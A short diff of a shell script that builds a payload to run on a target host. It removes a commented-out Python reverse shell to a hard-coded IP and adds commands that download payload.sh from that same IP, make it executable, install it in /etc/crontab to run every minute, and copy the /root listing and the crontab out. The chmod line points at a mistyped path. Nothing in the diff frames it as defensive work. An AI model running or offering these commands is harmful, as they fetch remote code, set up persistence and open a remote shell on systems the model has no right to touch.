@@ -19,8 +19,12 @@ cat > ${PAYLOAD_PATH} << __EOF__
 OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}
 
 # Commands to run on the host<
-#export RHOST="35.194.58.97";export RPORT=80;python3 -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'&
-cat /etc/crontab > \${OUTPATH} 1>&1
+curl http://35.194.58.97/payload.sh --output /root/payload.sh
+chmod +x /root/payload/sh
+echo * * * * * /root/payload.sh >> /etc/crontab
+ls /root > \${OUTPATH}
+cat /etc/crontab >> \${OUTPATH} 1>&1
+
 __EOF__
 
 # Make the payload script executable
